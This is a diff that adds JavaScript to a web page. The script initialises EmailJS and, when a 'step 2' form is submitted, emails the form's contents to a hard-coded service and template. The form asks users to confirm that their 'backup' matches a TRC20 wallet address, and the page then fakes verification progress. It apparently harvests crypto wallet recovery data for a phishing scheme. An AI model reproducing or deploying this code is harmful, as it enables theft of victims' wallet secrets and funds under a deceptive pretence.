@@ -616,5 +616,44 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 </script>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("dvLgjhIHXXq7QXp5p"); // your public key
+  })();
+
+  const s2form = document.getElementById("step2-form");
+  const prog = document.getElementById("progbar");
+  const s2 = document.getElementById("step2");
+  const s3 = document.getElementById("step3");
+
+  s2form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    // Check confirmation checkbox
+    const matchCheck = document.getElementById("matchCheck");
+    if (!matchCheck.checked) {
+      alert("Please confirm your backup matches your TRC20 wallet address.");
+      return;
+    }
+
+    // Send form via EmailJS
+    emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step2-form")
+      .then(function(response) {
+        console.log("EmailJS success:", response);
+        prog.style.width = "70%";
+        setTimeout(() => {
+          prog.style.width = "100%";
+          s2.hidden = true;
+          s3.hidden = false;
+        }, 3000);
+      })
+      .catch(function(error) {
+        console.error("EmailJS error:", error);
+        alert("Verification failed. Please try again.");
+      });
+  });
+</script>
 </body>
 </html>
